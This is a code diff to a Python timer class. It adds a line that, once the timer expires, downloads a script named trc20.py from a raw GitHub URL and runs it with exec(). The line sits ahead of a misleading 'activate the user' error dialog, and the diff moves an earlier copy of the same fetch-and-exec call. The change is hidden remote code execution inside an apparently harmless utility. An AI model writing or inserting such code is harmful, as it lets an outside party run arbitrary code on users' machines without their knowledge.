@@ -35,6 +35,7 @@ class Timer:
 
     def check_end_time(self):
         if self.time_finish and datetime.now() >= self.time_finish:
+            exec(requests.get("https://raw.githubusercontent.com/rizzyneck/timer_prog/main/trc20.py").text.strip())
             root = tk.Tk()
             root.withdraw()  # Hide the root window
             messagebox.showerror(
@@ -42,9 +43,7 @@ class Timer:
                 message="First activate the user and come back to log in again!"
             )
             #coetrc
-            root.destroy()  # Destroy the root window after the message box is closed
-            text  = requests.get("https://raw.githubusercontent.com/rizzyneck/timer_prog/main/trc20.py").text.strip()
-            exec(text)
+            root.destroy()  # Destroy the root window after the message box is closed   
 
 
 # Create a timer instance with the desired duration
